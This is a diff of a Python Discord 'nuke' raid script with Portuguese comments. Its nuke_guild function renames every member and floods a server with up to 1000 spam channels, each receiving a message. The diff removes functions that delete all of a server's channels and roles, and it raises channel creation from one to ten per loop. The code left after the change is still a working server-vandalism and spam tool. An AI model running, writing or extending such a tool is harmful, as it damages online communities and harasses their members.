@@ -26,26 +26,6 @@ baner = f'''
 {r}╚═════╝     ╚═╝  ╚═╝
 {y}Feito por: {g}Menor dk'''
 
-async def delete_all_channels(guild):
-    deleted = 0
-    for channel in guild.channels:
-        try:
-            await channel.delete()
-            deleted += 1
-        except:
-            continue
-    return deleted
-
-async def delete_all_roles(guild):
-    deleted = 0
-    for role in guild.roles:
-        try:
-            await role.delete()
-            deleted += 1
-        except:
-            continue
-    return deleted
-
 async def rename_all_members(guild, prefix):
     renamed = 0
     for member in guild.members:
@@ -73,7 +53,7 @@ async def create_text_channels_and_send_message(guild, name, message, stop_event
     
     while created < 1000 and not stop_event.is_set():
         tasks = []
-        for _ in range(1):  # Cria 1 canal de texto por vez
+        for _ in range(10):  # Cria 10 canais de texto por vez
             try:
                 channel = await guild.create_text_channel(name=name)
                 tasks.append(asyncio.create_task(channel.send(message)))
@@ -98,17 +78,11 @@ async def nuke_guild(guild, name, message, stop_event):
     # Renomeia os membros
     renamed = await rename_all_members(guild, '(T.C.C)')
     
-    # Deleta canais e papéis
-    deleted_channels = await delete_all_channels(guild)
-    delete_roles = await delete_all_roles(guild)
-    
     # Cria canais de texto e envia mensagens
     created_text_channels = await create_text_channels_and_send_message(guild, name, message, stop_event)
     
     print(f'{g}Servidor {w}{guild.name}{g} atualizado com sucesso!')
     print(f'{y}Membros renomeados: {g}{renamed}')
-    print(f'{y}Canais deletados: {g}{deleted_channels}')
-    print(f'{y}Papéis deletados: {g}{delete_roles}')
     print(f'{y}Canais de texto criados: {g}{created_text_channels}')
     print(f'{r}--------------------------------------------\n\n')
 
